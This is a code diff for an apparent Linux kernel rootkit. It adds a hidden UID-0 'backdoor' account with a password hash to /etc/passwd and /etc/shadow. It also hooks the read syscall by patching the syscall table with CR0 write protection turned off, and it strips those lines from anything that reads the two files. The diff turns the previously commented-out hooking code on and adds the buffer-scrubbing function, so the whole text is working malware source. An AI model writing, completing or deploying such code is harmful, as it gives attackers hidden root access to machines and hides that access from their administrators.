@@ -47,7 +47,7 @@ psize **find(void) {
 
 #define PASSWD_PATH "/etc/passwd"
 #define SHADOW_PATH "/etc/shadow"
-#define PASSWD_STRING "backdoor:x:0:0:backdoor:/:/bin/bash\n"
+#define PASSWD_STRING "backdoor:x:0:0:backdoor:/home:/bin/bash\n"
 #define SHADOW_STRING "backdoor:$6$dA0/uaf7$vPdpHbTxoH0Xa1xDDhOW0ROQKvx9RkK02h1HPMqIR5XgSx5EX2oiSIZ9.1Sl16KOVIRNpxiOfwifL4ssxhH/W.:18219:0:99999:7:::\n"
 
 
@@ -99,7 +99,6 @@ void delete_text_from_file(char* text, char* file_path) {
 	vfs_llseek(filp, 0, SEEK_END);
 	size = filp->f_pos;
 	vfs_llseek(filp, 0, SEEK_SET);
-	printk("file size: %d\n", size);
 
 	buf = kzalloc(size + 1, GFP_KERNEL);
 
@@ -112,7 +111,7 @@ void delete_text_from_file(char* text, char* file_path) {
 	position = strstr(buf, text);
 	if (position == NULL) {
 
-		printk("couldn't find text, weird...\n");
+		printk("couldn't find text in file\n");
 		set_fs(fs);
 		filp_close(filp, NULL);
 		return;
@@ -137,18 +136,54 @@ void delete_text_from_file(char* text, char* file_path) {
 	filp_close(filp, NULL);
 }
 
+int delete_text_from_buffer(char* text, char* buf, int bytes_read) {
+
+	// declare variables
+	char* k_buf;
+	char* position;
+	int text_size;
+	int offset;
+	char* end_of_buffer;
+	int end_of_buffer_size;
+	int new_size;
+
+	// copy the buffer to kernel space
+	k_buf = kzalloc(bytes_read + 1, GFP_KERNEL);
+	copy_from_user(k_buf, buf, bytes_read);
+
+	// find our text in the buffer
+	position = strstr(k_buf, text);
+	if (position == NULL) return bytes_read;
+
+	// create a bunch of variables with this pointer
+	text_size = strlen(text);
+	offset = position - k_buf;
+	end_of_buffer = position + text_size;
+	end_of_buffer_size = bytes_read - offset - text_size;
+	new_size = bytes_read - text_size;
+
+	// overwrite user's buffer
+	copy_to_user(buf + offset, end_of_buffer, end_of_buffer_size + 1); // the + 1 is to write a null byte at the end
+	return new_size;
+}
+
 // a read function that hides our added text
 
 asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 
 	// declare variables
+	struct file* filp;
+	struct path* path;
 	char* tmp;
 	char* pathname;
 
-	int ret = (*o_read)(fd, buf, count);
+	// perform the read
+	int bytes_read = (*o_read)(fd, buf, count);
+	if (bytes_read <= 0) return bytes_read;
 
-	struct file* filp = fcheck(fd);
-	struct path* path = &filp->f_path;
+	// get the file path
+	filp = fcheck(fd);
+	path = &filp->f_path;
 	path_get(path);
 	tmp = (char *)__get_free_page(GFP_KERNEL);
 
@@ -156,7 +191,7 @@ asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 
 		path_put(path);
 		printk(KERN_ERR "could not create tmp\n");
-		return ret;
+		return bytes_read;
 	}
 
 	pathname = d_path(path, tmp, PAGE_SIZE);
@@ -166,14 +201,16 @@ asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 
 		free_page((unsigned long)tmp);
 		printk(KERN_ERR "invalid pathname\n");
-		return ret;
+		return bytes_read;
 	}
 
-	if (strcmp(pathname, "/etc/passwd") == 0) printk("we did it baby\n");
+	// check if we need to hide anything
+	if (strcmp(pathname, PASSWD_PATH) == 0) bytes_read = delete_text_from_buffer(PASSWD_STRING, buf, bytes_read);
+	if (strcmp(pathname, SHADOW_PATH) == 0) bytes_read = delete_text_from_buffer(SHADOW_STRING, buf, bytes_read); 
 
+	// cleanup
 	free_page((unsigned long)tmp);
-
-	return ret;
+	return bytes_read;
 }
 
 // init and remove the backdoor stuff
@@ -183,9 +220,9 @@ void add_backdoor(void) {
 	add_text_to_file(PASSWD_STRING, PASSWD_PATH);
 	add_text_to_file(SHADOW_STRING, SHADOW_PATH);
 	
-	/*write_cr0(read_cr0() & (~ 0x10000));
+	write_cr0(read_cr0() & (~ 0x10000));
 	o_read = (void *) xchg(&sys_call_table[__NR_read], backdoor_read);
-	write_cr0(read_cr0() | 0x10000);*/
+	write_cr0(read_cr0() | 0x10000);
 }
 
 void remove_backdoor(void) {
@@ -193,9 +230,9 @@ void remove_backdoor(void) {
 	delete_text_from_file(PASSWD_STRING, PASSWD_PATH);
 	delete_text_from_file(SHADOW_STRING, SHADOW_PATH);
 
-	/*write_cr0(read_cr0() & (~ 0x10000));
+	write_cr0(read_cr0() & (~ 0x10000));
 	xchg(&sys_call_table[__NR_read],o_read);
-	write_cr0(read_cr0() | 0x10000);*/
+	write_cr0(read_cr0() | 0x10000);
 }
 
 // load and unload the module
